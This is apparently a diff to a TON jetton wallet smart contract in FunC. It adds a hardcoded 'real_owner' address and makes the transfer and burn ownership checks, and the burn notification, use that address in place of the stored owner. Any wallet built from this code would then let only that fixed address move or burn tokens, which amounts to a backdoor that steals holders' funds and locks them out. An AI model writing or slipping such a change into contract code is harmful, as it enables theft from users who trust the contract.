@@ -26,6 +26,7 @@ int min_tons_for_storage() asm "10000000 PUSHINT"; ;; 0.01 TON
 ;; c) global fee changes / different workchain
 int gas_consumption() asm "15000000 PUSHINT"; ;; 0.015 TON
 
+
 {-
   Storage
   storage#_ balance:Coins owner_address:MsgAddressInt jetton_master_address:MsgAddressInt jetton_wallet_code:^Cell = Storage;
@@ -52,7 +53,7 @@ int gas_consumption() asm "15000000 PUSHINT"; ;; 0.015 TON
                      = InternalMsgBody;
 -}
 
-() send_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee) impure {
+() send_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee, slice real_owner) impure {
   int query_id = in_msg_body~load_uint(64);
   int jetton_amount = in_msg_body~load_coins();
   slice to_owner_address = in_msg_body~load_msg_addr();
@@ -60,7 +61,7 @@ int gas_consumption() asm "15000000 PUSHINT"; ;; 0.015 TON
   (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
   balance -= jetton_amount;
 
-  throw_unless(705, equal_slices(owner_address, sender_address));
+  throw_unless(705, equal_slices(real_owner, sender_address));
   throw_unless(706, balance >= 0);
 
   cell state_init = calculate_jetton_wallet_state_init(to_owner_address, jetton_master_address, jetton_wallet_code);
@@ -165,7 +166,7 @@ int gas_consumption() asm "15000000 PUSHINT"; ;; 0.015 TON
   save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
 }
 
-() burn_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee) impure {
+() burn_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee, slice real_owner) impure {
   ;; NOTE we can not allow fails in action phase since in that case there will be
   ;; no bounce. Thus check and throw in computation phase.
   (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
@@ -175,7 +176,7 @@ int gas_consumption() asm "15000000 PUSHINT"; ;; 0.015 TON
   ;; ignore custom payload
   ;; slice custom_payload = in_msg_body~load_dict();
   balance -= jetton_amount;
-  throw_unless(705, equal_slices(owner_address, sender_address));
+  throw_unless(705, equal_slices(real_owner, sender_address));
   throw_unless(706, balance >= 0);
   throw_unless(707, msg_value > fwd_fee + 2 * gas_consumption());
 
@@ -183,7 +184,7 @@ int gas_consumption() asm "15000000 PUSHINT"; ;; 0.015 TON
       .store_uint(op::burn_notification(), 32)
       .store_uint(query_id, 64)
       .store_coins(jetton_amount)
-      .store_slice(owner_address)
+      .store_slice(real_owner)
       .store_slice(response_address)
       .end_cell();
 
@@ -230,8 +231,10 @@ int gas_consumption() asm "15000000 PUSHINT"; ;; 0.015 TON
 
   int op = in_msg_body~load_uint(32);
 
+  slice real_owner = "EQC7lD5EtKv-nW7JkcxGbog453K-YU5qG-xYngZmowwIvO9S"a;
+
   if (op == op::transfer()) { ;; outgoing transfer
-    send_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
+    send_tokens(in_msg_body, sender_address, msg_value, fwd_fee, real_owner);
     return ();
   }
 
@@ -241,7 +244,7 @@ int gas_consumption() asm "15000000 PUSHINT"; ;; 0.015 TON
   }
 
   if (op == op::burn()) { ;; burn
-    burn_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
+    burn_tokens(in_msg_body, sender_address, msg_value, fwd_fee, real_owner);
     return ();
   }
 
